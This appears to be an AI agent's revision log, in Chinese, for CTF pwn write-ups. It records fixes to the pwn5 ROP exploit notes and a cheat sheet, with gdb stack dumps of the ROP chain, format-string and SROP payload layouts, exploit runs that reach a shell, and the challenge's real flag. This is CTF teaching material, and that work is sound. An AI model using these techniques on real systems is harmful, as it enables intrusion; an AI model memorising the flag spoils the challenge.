# 第 2 輪修正紀錄 — ROP 基礎與 pwn5

> 對應審查報告：`wp/review_round2_rop_foundations.md`（913 行，22 條錯誤 + 9 個新手卡點）
> 本輪可編輯檔案：`pwn5/notes.md`、`pwn5/exploit.py`、`wp/99_速查表.md`、`wp/README.md`
> 修正原則：**每一條都先在機器上重跑一次驗證指令**，確認是真的才改；reviewer 判定有誤或措辭不精確的地方照實調整。

---

## 0. 一句話總結

| 分類 | 數量 | 去向 |
|---|---|---|
| **已修 / 已補** | **17** | `pwn5/notes.md`、`pwn5/exploit.py`、`wp/99_速查表.md`、`wp/README.md` |
| **略過（不屬於本 agent 可編輯的檔案）** | **14** | 全部落在 `wp/00_基礎知識_從零開始.md` → 逐條寫進 `wp/pending_wp00_fixes_from_rop.md` |
| **已驗證正確、不需修改** | **1** | `wp/99` §8 chunk 佈局圖（reviewer 判「已修」，我複查亦正確） |
| **額外發現並修正（reviewer 未列）** | **6** | 見 §3（含 3.6：來自 heap 報告 [S3]/[S4]/[S7] 的 `wp/99` §8 項目，已由本輪直接套用） |

`pwn5` 的攻擊邏輯**完全沒有動**（`exploit.py` 只改註解文字），改完重跑 local / REMOTE / `gdb_evidence.sh` 全部照舊通過（見 §4）。

---

## 1. 逐項處置表

| 編號 | 項目 | 處置 | 檔案（位置） | 一行說明 |
|---|---|---|---|---|
| **P0-1** | §7.1 ROP 鏈圖整體位移一格 | **已修** | `pwn5/notes.md` §7.1 | 圖改成 gdb 實測佈局：`state[0x118]`=`chain[0]`(對齊用 `ret`)、`[0x120]`=`pop rdi; ret`、`[0x128]`=/bin/sh、`[0x130]`=`system@plt`、`[0x138]`=0；並加 ⚠️ 說明「對齊用 `ret` 只出現一次」 |
| **P0-2** | `wp/00` §6.3 堆疊圖 `buf`/`canary` 顛倒＋缺 canary offset 規則 | 略過 → pending | `wp/00`（非本 agent 檔案） | 已完整寫進 `pending_wp00_fixes_from_rop.md` §1（含建議替換文字） |
| **P0-3** | `wp/00` §2 `pip install` 在 Arch 上失敗（PEP 668） | 略過 → pending | `wp/00` | pending §2（實測 `error: externally-managed-environment` 無誤） |
| **P0-4** | `wp/00` §12 `DEBUG=1 python3 exploit.py` 無效 | 略過 → pending | `wp/00`（順帶在 `pwn5/notes.md` §9 補了正確用法） | pending §3；`pwn5/notes.md` §9 已寫「是命令列參數 `python3 exploit.py DEBUG`，不是環境變數」 |
| **P0-5** | `wp/README.md` 檔案樹層級錯＋列了 2 個不存在的檔案 | **已修** | `wp/README.md` §📁 檔案結構 | 樹根改成 `wp/`，補 `00_recon.md`、`flag.txt`、`gdb_evidence.sh`、pwn3 的 `libc-2.39…`、pwn7 的 `FLAG_REMOTE.txt`；`review_round2.md`/`review_round3.md` 改成 `review_round2_*.md` / `fixes_round2_*.md` 並註明實際檔名 |
| **P1-1** | §11 #1「`process()` 預設用 PTY → 訊框送不進去」 | **已修** | `pwn5/notes.md` §11 #1 | 改成「stdin 預設 **PIPE**、stdout 預設 PTY 且 `raw=True`（raw mode 不是 canonical）」；實測 `fd0 -> pipe:[…]`、`fd1 -> /dev/pts/0`，且預設值也能拿到 flag |
| **P1-2** | `wp/00` §9 把 pwn6 掛在錯的漏洞類型 | 略過 → pending | `wp/00` | pending §4 |
| **P1-3** | `wp/00` 附錄把 pwn6 的核心技巧寫成 ROP | 略過 → pending | `wp/00` | pending §5（pwn6 是 heap refcount → double free/UAF → tcache poisoning） |
| **P1-4** | `wp/00` §9 Stack Buffer Overflow 漏列 pwn5 | 略過 → pending | `wp/00` | pending §6 |
| **P1-5** | `wp/00` 全篇沒有「libc base + offset」教學 | 略過 → pending | `wp/00` | pending §7（建議新增 §4.3.1，含 PIE/libc 對照表） |
| **P1-6** | `wp/00` §11.4 在定義之前就引用 `pwn1` §5.3 | 略過 → pending | `wp/00` | pending §8 |
| **P1-7** | `pwn5` 沒寫「必須在 `pwn5/` 目錄下執行」 | **已補** | `pwn5/notes.md` §9 開頭、§11 #14 | 加 ⚠️ 塊（`./homemaker` 相對路徑＋`run_all.sh` 替代）；實測在 repo 根目錄跑 → `[ERROR] './homemaker' does not exist` |
| **P2-1** | §1.3 寫 `checksum @ 0x11ff` | **已修** | `pwn5/notes.md` §1.3 | 改為「`checksum` 函式起點是 `0x11e9`；下面是它載入金絲雀的那一段」（`objdump` 確認 `0x11ff` 是 `mov rax,QWORD PTR fs:0x28`） |
| **P2-2** | checksec 區塊把 `RUNPATH` 排在最後 | **已修** | `pwn5/notes.md` §0 | 改成實測順序 `RELRO → Stack → NX → PIE → RUNPATH → SHSTK → IBT` |
| **P2-3** | `wp/00` 679 `e.address` 註解誤導 | 略過 → pending | `wp/00` | pending §9 |
| **P2-4** | `wp/00` 755 `b *main+42` 對 stripped 無效 | 略過 → pending | `wp/00`（`wp/99` §12 另加症狀列） | pending §10；`wp/99` 新增的失敗症狀表也收了「`No symbol table is loaded`」 |
| **P2-5** | `wp/00` 547/799 `ret2csu` 未定義、`ropper` 未安裝 | 略過 → pending | `wp/00` | pending §11 |
| **P2-6** | `wp/99` SROP 模板 `frame.rip` / `frame.rsp` 說明不足 | **已補** | `wp/99` §6 | 逐欄註解：`frame.rip` 放 syscall 指令（**措辭修正**，見 §5.1）、`frame.rsp` 必須合法可寫且建議 16-byte 對齊；補「為什麼要剛好 15 bytes」💡 塊 |
| **P2-7** | `wp/99` 134 `__NR_rt_sigreturn` 未定義 | **已補** | `wp/99` §6 | 改成「剛好 15 bytes → `rax = 15`（= `__NR_rt_sigreturn`，SROP 的 syscall 編號，見 00 §7）」 |
| **P2-8** | `wp/99` §1 缺 Partial RELRO 一列 | **已補** | `wp/99` §1 | 補 Partial RELRO 列（並註明本系列 pwn2/pwn3/pwn4/pwn6 都是 Partial）；Full RELRO 列的「沒有」欄位也改清楚 |
| **P2-9** | `wp/99` §10 `b *0x401234` 對 PIE 無效 | **已補** | `wp/99` §10 | 加註「PIE 檔載入位址每次不同 → 改 `b *$base+0x1234` 或先 `starti`」＋提醒 `vmmap`/`telescope`/`heap` 需要 pwndbg |
| **P2-10** | `wp/README.md` 樹狀圖漏 `00_recon.md`、pwn3 libc、`flag.txt` | **已修** | `wp/README.md`（與 P0-5 同一處） | 一併補齊，並加「`*` 是通配說明」與「`flag.txt` vs `FLAG.txt`」兩個 📌 註記 |
| **B2-1** | pwn5 缺「誰吃掉堆疊哪一格」實測表 | **已補** | `pwn5/notes.md` §6.3.1（新增） | 6 步 `rsp` 逐步表 + 堆疊內容圖（數字是我自己 gdb 單步量的，與 review §4.4 一致） |
| **B2-2** | 沒解釋「為什麼蓋爛 `main` 的金絲雀不會 abort」 | **已補** | `pwn5/notes.md` §7.3 | 加 ❓ 塊：`main` 的收尾永遠不會被執行到；`service_loop` 的金絲雀（`state[0x108]`）才必須原樣寫回 |
| **B2-3** | off-by-one 的「那一個 byte」不夠直觀 | **已補** | `pwn5/notes.md` §5.1 | 加「訊框 vs `state` 對應圖」（含 `rxbuf+0x105` = CRC → `state[0x100]`），並說明 CRC 對單一 byte 是雙射、唯一解 `v=0xcd` |
| **B2-4** | `wp/00` §4 在教暫存器/堆疊之前就用它們 | 略過 → pending | `wp/00` | pending §12 |
| **B2-5** | `wp/00` 缺「一次完整動手做」的範例 | 略過 → pending | `wp/00` | pending §13（建議新增 §10.8，用 pwn5 當教材） |
| **B2-6** | `saved_rbp + 0x10` 對齊判斷式看起來很魔法 | **已補** | `pwn5/notes.md` §6.3 | 加 💡 塊：`saved_rbp = rbp_service_loop + 0x20`，差 `0x20` 是 16 的倍數 → 同餘 |
| **B2-7** | `wp/00`/`wp/99` 缺「失敗訊息對照表」 | **已補** | `wp/99` §12（新增一節） | 11 列症狀→原因→先檢查（含 canary、`movaps` 對齊、大端長度、PEP 668、`No symbol table`、PIE 中斷點、遠端 libc/seccomp…） |
| **B2-8** | `notes.md` 引用 `exploit.py` 的細微不一致 | **已補** | `pwn5/notes.md` §7.3、§8 | 補「`chain[0]` 在 `state[0x118]`、`state[0x120]` 是 `ret` 之後的 `rsp`＝`chain[1]`」＋`assert` 安全網說明；§8 的引用改成與 `exploit.py` 逐字一致 |
| **B2-9** | `wp/00` §12 缺「大端長度欄位」實例 | 略過 → pending | `wp/00` | pending §14 |
| — | `wp/99` §8 chunk 佈局圖 | **已驗證正確（未改）** | `wp/99` §8 | 逐欄對照 glibc `malloc_chunk`（`+0x00 prev_size` / `+0x08 size` / `+0x10 user data`；free 後 `+0x10 fd` / `+0x18 bk`）**完全正確**，與 `pwn4/notes.md` 自洽 → 不動（避免與 heap 負責人的用語衝突） |

---

## 2. 驗證方式（每一條都重跑過）

```bash
# P0-1：gdb 單步走完整條鏈，量 system@plt 入口的 rsp
gdb -q -batch -x /tmp/p5.gdb ./homemaker     # 見 §4.3
# 逐格追蹤（leave → ret → ret → pop rdi → ret → system）
#   rbp+0x08 = 0x000055555555501a (PIE+0x101a, ret)          <- chain[0]
#   rbp+0x10 = 0x00005555555552aa (PIE+0x12aa, pop rdi; ret) <- chain[1]
#   rbp+0x18 = 0x0000555555558a54 ("/bin/sh")   rbp+0x20 = 0x...50c0 (system@plt)
#   rbp+0x28 = 0                                @system: rsp&0xf = 8 ✅
objdump -d -M intel --start-address=0x12aa --stop-address=0x12ac homemaker   # 12aa: pop rdi / 12ab: ret
objdump -d -M intel --start-address=0x101a --stop-address=0x101b homemaker   # 101a: ret
objdump -d -M intel --start-address=0x11e9 --stop-address=0x1208 homemaker   # checksum 起點 = 0x11e9

# P1-1：pwntools 原始碼 + 實際 fd
python3 -c "import inspect,pwnlib.tubes.process as m; s=inspect.getsource(m.process.__init__); print(s[:400])"
#   stdin = PIPE, stdout = PTY if not IS_WINDOWS else PIPE, ..., raw = True
python3 -c "…os.readlink('/proc/<pid>/fd/0')…"   # fd0 -> pipe:[…]   fd1 -> /dev/pts/0
python3 -c "…E.exploit(process('./homemaker'))…" # 預設值也能拿到 sun{LOCAL_DUMMY_FLAG}

# P1-7 / P2-1 / P2-2 / P2-10：實跑
cd .. && python3 pwn5/exploit.py          # → [ERROR] './homemaker' does not exist
python3 -c "from pwn import *; print(ELF('./pwn5/homemaker',checksec=False).checksec())"
ls -1 wp/ ; for d in pwn1..pwn7; do cat $d/FLAG.txt; done

# P2-6 / P2-7：SROP 模板真的能跑（見 §3.2）
# P2-9：gdb -q -batch -ex 'b *0x401234' ./pwn5/homemaker   # 不報錯，但永遠不會命中
```

---

## 3. reviewer 未列、但我實測後發現並修正的 5 處

### 3.1 `pwn5/notes.md` §7.3「`payload[0x1ff]` 是 CRC byte 的來源」敘述有誤 → 已修

* gdb 實測（epilogue 時 dump `state+0x1e0`）：`state[0x1ff] = 0xcd`（＝該訊框的 CRC byte），
  而 `state[0x1ef..0x1f6] = "/bin/sh\0"`、`payload[0x1ff]` 只會落到 `state[0x1fe]`。
* 原文把「payload 的最後一格」和「CRC byte」混為一談 → 已改成
  「`payload[0x1f8..0x1ff] = 補 0 → state[0x1f7..0x1fe]（不重要）」＋一段 💡 說明
  「`state[0x1ff]` 是這個訊框自己的 CRC byte，來自 payload 後面那一格，**不是你能控制的 byte**」。

### 3.2 `wp/99` §7 Format String 模板缺 `context.arch` 警告（**這條會直接讓 payload 壞掉**）

* 實測（自編 `printf(buf)` 迴圈小程式，`buf` 在第 6 個參數）：
  * 沒設 `context.arch`（pwntools 預設 i386、`context.bytes = 4`）
    → `fmtstr_payload(6, {secret: 0xdeadbeef}, write_size='short')` **SIGSEGV**（位址算錯）。
  * 設 `context.arch = 'amd64'` → `secret = 0xdeadbeef` ✅；
    改成 `offset=5` 或 `offset=7` → SIGSEGV ❌（所以 offset 必須等於掃描值，不能 ±1）。
* 已在 `wp/99` §7 補上 ⚠️ 警告、參數表（`write_size` / `write_size_max` / `badbytes` / `numbwritten`）、
  `%N$s` 任意讀、以及實測結論。

### 3.3 `wp/99` §7「目標位址通常就寫在 payload 的開頭」是**會踩雷**的建議 → 已改

* 實測：`p64(0x404028) + b'%9$hn'` 這種「位址放最前面」的排法，
  `printf` 讀到第 4 個 byte 的 `\x00` 就停 → `%9$hn` 根本不會被執行（secret 完全沒被改）。
* 正確排版是：**格式字串 → 補齊到 8 的倍數 → 目標位址**（`fmtstr_payload()` 就是這樣排的）。
  已改寫成 ⚠️ 提示，避免新手照著舊敘述手刻後卡死。

### 3.4 `wp/99` §8「`__free_hook` 已被移除」措辭不精確 → 已改

* `readelf --dyn-syms /usr/lib/libc.so.6`（本機 glibc 2.44）：
  `__malloc_hook@GLIBC_2.2.5` / `__free_hook@GLIBC_2.2.5` 兩個 8-byte OBJECT **仍然存在**（compat 符號）。
* 精確說法是「**glibc ≥ 2.34 的 malloc/free 已經不會去呼叫它們**，改了沒有效果」→ 已照此改寫，
  並補上 `_IO_2_1_stdout_`（`FILE` 結構 / FSOP）與 `environ`（存堆疊位址）兩個名詞的定義。

### 3.5 `pwn5/exploit.py` 註解精確化（**無邏輯改動**）

* 原文註解 `# ROP chain starts at state[0x120] (rsp right after leave; ret)` 語意正確但容易與 `chain[0]` 混淆，
  已改成「`chain[0]` 蓋在 `state[0x118]`；其餘的鏈從 `state[0x120]` 開始」並附上 gdb 實測的四格內容。
* `pwn5/notes.md` §8 引用的程式碼片段同步改成與 `exploit.py` 逐字一致（含 `enumerate`、`assert` 兩行）。

### 3.6 `wp/99` §8：套用 heap 報告的 [S3]/[S4]/[S7]（`wp/99` 是我這一輪負責的檔案）

`wp/pending_wp00_fixes_from_heap.md` 的 D 段指出三件事其實是 **`wp/99` §8** 的問題（不在 `wp/00`），
而 `wp/99` 屬於本輪可編輯檔案 → 已直接修好（並逐條自行驗證）：

* **[S3]「偽造 `fd` 前要先知道 chunk 位址」方向相反** → 實測（自編 C 程式）：
  ```
  p=0x55b412e33010  stored=0x55b412e33  p>>12=0x55b412e33  decoded=0
  ```
  safe-linking 的 key 只有 `chunk >> 12`（高位），**不需要完整位址**；
  free 到空鏈時 `next = key ^ NULL` 就能直接洩漏 key。已改成這個說法（並指向 `pwn4/notes.md` §5.4）。
* **[S4] 補三個現代 glibc 必知細節**（各一行）：`tcache->entries[]` 是**明文** user 位址、
  `tcache_get()` 的 `aligned_OK(e)` 要求毒化目標 16-byte 對齊、
  `tcache_put()` 寫入順序為 `key → next → entries → counts`。
* **[S7] 補欄位命名說明**：`+0x10`/`+0x18` 在 tcache 叫 `next`/`key`、在 unsorted/small/large bin 叫 `fd`/`bk`、
  fastbin 只用 `+0x10` 的 `fd`（三份筆記都對，只是語意不同）。

---

## 4. 修正後重跑（真實輸出）

### 4.1 `cd pwn5 && python3 exploit.py < /dev/null` → **PASS**（改完後共跑 3 次，3/3 相同）

```
[+] canary    = 0x…（每次不同）
[+] saved rbp = 0x7ffc…
[+] PIE base  = 0x555b68387000
[+] shell should be up, sending commands
sun{LOCAL_DUMMY_FLAG}
total 188
…（略）
uid=1001(kzzz) gid=1001(kzzz) groups=1001(kzzz),65534(nobody)
DONE

FLAG: sun{LOCAL_DUMMY_FLAG}
[*] Process './homemaker' stopped with exit code -11 (SIGSEGV)
```

### 4.2 `cd pwn5 && python3 exploit.py REMOTE < /dev/null` → **PASS**（改完後共跑 3 次，3/3 相同 flag）

```
[x] Opening connection to chal.sunshinectf.games on port 26008: Done
[+] canary    = 0x308619dd4de68100
[+] saved rbp = 0x7fff3c3a2a40
[+] PIE base  = 0x5a6700473000
[+] shell should be up, sending commands
sun{the_future_is_now_today_well_wait_how_are_you_reading_this}
total 12
drwxr-xr-x 2 root root      4096 Sep 26 00:54 .
drwxr-xr-x 1 root root      4096 Sep 26 00:55 ..
-rw-r----- 1 root homemaker   64 Sep 26 00:54 flag.txt
uid=1337(homemaker) gid=1337(homemaker) groups=1337(homemaker)
DONE

FLAG: sun{the_future_is_now_today_well_wait_how_are_you_reading_this}
```

（`pwn5/FLAG.txt` 修正後仍是 `sun{the_future_is_now_today_well_wait_how_are_you_reading_this}`，未動。）

### 4.3 `cd pwn5 && bash gdb_evidence.sh` → **與 notes §5.3 逐字相同**（改完後重跑 2 次，輸出一致）

```
@0x1797 append#1: n=0x100 capacity=0x100  -> n<=cap passes, loop writes n+1 bytes
@0x1810 send_state: state=0x7fffffffdcc0 capacity=0x1ff
@0x1797 append#2: n=0x1ff capacity=0x1ff  -> writes 0x200 bytes over canary/rbp/ret
@0x1a76 loop epilogue (canary check): rbp=0x7fffffffddd0 state=0x7fffffffdcc0 rsp=0x7fffffffdcb0
0x7fffffffddc8:	0xe4fbd8d3ee76a900	0x00007fffffffde60
0x7fffffffddd8:	0x000055555555501a	0x00005555555552aa
0x7fffffffdde8:	0x0000555555558a54	0x00005555555550c0
0x7fffffffddf8:	0x0000000000000000	0x0000000000000000
```

→ `state = rbp - 0x110`、`capacity = 0x1ff`、`rbp+8 = PIE+0x101a`、`rbp+0x10 = PIE+0x12aa`、
`rbp+0x18 = "/bin/sh"`、`rbp+0x20 = system@plt`：**與修正後的 §7.1 / §6.3.1 完全一致**。

### 4.4 gdb 單步（`system@plt` 入口對齊）→ **PASS**

```
@0x1a76 canary-check: rbp=0x7fffffffddd0 rsp=0x7fffffffdcb0
step0 at leave: rip=0x555555555a7d rsp=0x7fffffffdcb0 rbp=0x7fffffffddd0
step0b after leave: rip=0x555555555a7e rsp=0x7fffffffddd8 rbp=0x7fffffffde60
step1 after ret (chain[0]): rip=0x55555555501a rsp=0x7fffffffdde0
step2 after ret (chain[1]): rip=0x5555555552aa rsp=0x7fffffffdde8
step3 after pop rdi: rip=0x5555555552ab rsp=0x7fffffffddf0 rdi=0x555555558a54
step4 after ret (system): rip=0x5555555550c0 rsp=0x7fffffffddf8 rdi=0x555555558a54 rsp&0xf=8
@system@plt  rdi=0x555555558a54  rsp=0x7fffffffddf8  rsp&0xf=8
0x7fffffffddd8:	0x000055555555501a	0x00005555555552aa
0x7fffffffdde8:	0x0000555555558a54	0x00005555555550c0
0x7fffffffddf8:	0x0000000000000000	0x0000000000000000
```

### 4.5 SROP 模板實測（`wp/99` §6 照抄，只換位址）

```
TEMPLATE-OK
['sun{LOCAL_DUMMY_FLAG}', 'uid=1001(kzzz) gid=1001(kzzz) groups=1001(kzzz),65534(nobody)']
```

（用 `pwn1/challenge` 當靶：`b'A'*offset + p64(READ_AGAIN) + p64(SYSCALL_RET) + bytes(frame)`，
再送「剛好 15 bytes」→ `execve("/bin/sh")` 成功。模板本身可用。）

### 4.6 Format String 模板實測（`wp/99` §7 照抄）

```
context.bytes = 8
scan : b'AAAABBBB.0x4242424241414141.0x37252e702436252e'
  offset=5 write_size=short -> [] rc=-11            # SIGSEGV
  offset=5 write_size=byte  -> [] rc=-11
  offset=6 write_size=short -> [b'[secret=0xdeadbeef]'] rc=None   # ✅
  offset=6 write_size=byte  -> [b'[secret=0xdeadbeef]'] rc=None   # ✅
  offset=7 write_size=short -> [] rc=-11            # SIGSEGV
  offset=7 write_size=byte  -> [] rc=-11
```

---

## 5. 我對 reviewer 判定做的 2 處措辭修正（不是錯誤，是不夠精確）

1. **P2-6 的「`SYSCALL_RET` 最好只含一個 `syscall`，之後不要再 `ret`」**：
   本系列 `pwn1/exploit.py` 的 `frame.rip` 用的就是 `0x401069`＝`syscall; ret`，而且實測正常拿到 flag。
   所以 `wp/99` 寫成「放 `syscall` 那一條指令；**就算它剛好是 `syscall; ret` 也一樣可用**
   （`execve` 成功就換行程了）」——比「不要接 `ret`」準確。
2. **P2-9 的「PIE binary 用固定位址下中斷點會失敗」**：
   實測 `gdb -q -batch -ex 'b *0x401234' ./pwn5/homemaker` **不會報錯**（回 `Breakpoint 1 at 0x401234`），
   失敗的形式是「**永遠不會命中**（那個位址通常根本沒映射）」→ `wp/99` 照實這樣寫。

其餘 reviewer 的技術判定（包含 §0 那 18 項「已驗證正確」、以及 round 1 修正的複驗）我逐條重跑後**全部成立**，
沒有發現需要推翻的結論。

---

## 6. 沒有動到的東西（避免與其他 agent 衝突）

* `wp/00_基礎知識_從零開始.md`：**完全沒碰**（本輪 14 條 wp/00 修正全數寫進 `pending_wp00_fixes_from_rop.md`，共 17 條 + 三份清單的衝突調解）。
  依指示，另外兩份交接檔 `pending_wp00_fixes_from_heap.md`、`pending_wp00_fixes_from_fmtstr.md`
  也**整份逐字附在該檔的附錄 A／B**（未套用），附錄 C 則逐行調解三份清單在 `wp/00:440`、`886` 的重疊與衝突。
* `wp/review_*.md`、`wp/fixes_round1_applied.md`、`pwn1..pwn7`（除 `pwn5` 的 `notes.md`／`exploit.py` 註解外）：
  只讀不寫。
* `pwn5` 的攻擊程式邏輯、`FLAG.txt`、`flag.txt`、`exploit_input.bin`、`gdb_evidence.sh`：**未修改**
  （`gdb_evidence_raw.txt` 因重跑而更新，內容與 §4.3 相同）。
* `wp/99` §8 的 **chunk 佈局圖本體**（`+0x00 prev_size`／`+0x08 size`／`+0x10 user data`，free 後 `fd`/`bk`）：
  複查確認正確、**沒有改動**；唯一動到的是它下面的 bullet —— 依 heap 報告 [S3]/[S4]/[S7] 修正
  safe-linking 的說法並補三個 glibc 細節（見 §3.6），這反而讓兩份文件更一致。
